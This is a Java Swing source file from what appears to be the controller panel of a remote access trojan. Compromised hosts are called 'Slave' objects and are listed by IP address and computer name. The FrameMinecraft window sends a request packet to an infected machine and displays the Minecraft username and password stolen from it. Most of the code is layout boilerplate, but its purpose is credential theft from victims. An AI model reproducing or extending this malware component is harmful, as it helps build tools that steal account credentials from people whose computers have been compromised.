package com.redpois0n.ui.frames;

import java.awt.Color;
import java.awt.Toolkit;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.util.HashMap;

import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JTextField;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.border.EmptyBorder;

import com.redpois0n.Slave;
import com.redpois0n.packets.outgoing.Packet50MinecraftPassword;

@SuppressWarnings("serial")
public class FrameMinecraft extends BaseFrame {

	private JPanel contentPane;

	public static HashMap<Slave, FrameMinecraft> instances = new HashMap<Slave, FrameMinecraft>();
	public Slave slave;
	private JTextField txtUser;
	private JTextField txtPass;
	private JLabel lblStatus;

	public void setStatus(String msg, boolean error) {
		lblStatus.setText(msg);
		lblStatus.setForeground(error ? Color.red : Color.black);
	}

	public void setUserPass(String user, String pass) {
		txtUser.setText(user);
		txtPass.setText(pass);
	}

	public FrameMinecraft(Slave slave) {
		super();
		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameMinecraft.class.getResource("/icons/minecraft.png")));
		setResizable(false);
		addWindowListener(new WindowAdapter() {
			@Override
			public void windowClosing(WindowEvent arg0) {
				exit();
			}
		});
		this.slave = slave;
		instances.put(slave, this);
		final Slave sl = slave;
		setTitle("Minecraft - " + sl.getIP() + " - " + sl.getComputerName());
		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		setBounds(100, 100, 371, 155);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);

		JLabel lblUsername = new JLabel("Username:");

		JLabel lblPassword = new JLabel("Password:");

		txtUser = new JTextField();
		txtUser.setEditable(false);
		txtUser.setColumns(10);

		txtPass = new JTextField();
		txtPass.setEditable(false);
		txtPass.setColumns(10);

		lblStatus = new JLabel("Loading...");
		GroupLayout gl_contentPane = new GroupLayout(contentPane);
		gl_contentPane.setHorizontalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addContainerGap().addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addGroup(gl_contentPane.createParallelGroup(Alignment.TRAILING).addComponent(lblUsername).addComponent(lblPassword)).addPreferredGap(ComponentPlacement.RELATED).addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addComponent(txtPass, GroupLayout.DEFAULT_SIZE, 279, Short.MAX_VALUE).addComponent(txtUser, GroupLayout.DEFAULT_SIZE, 279, Short.MAX_VALUE))).addComponent(lblStatus)).addContainerGap()));
		gl_contentPane.setVerticalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addContainerGap().addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE).addComponent(lblUsername).addComponent(txtUser, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)).addPreferredGap(ComponentPlacement.RELATED).addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE).addComponent(txtPass, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE).addComponent(lblPassword)).addPreferredGap(ComponentPlacement.RELATED, 35, Short.MAX_VALUE).addComponent(lblStatus).addContainerGap()));
		contentPane.setLayout(gl_contentPane);
		setVisible(true);
		
		slave.addToSendQueue(new Packet50MinecraftPassword());
	}

	public void exit() {
		instances.remove(slave);
	}
}
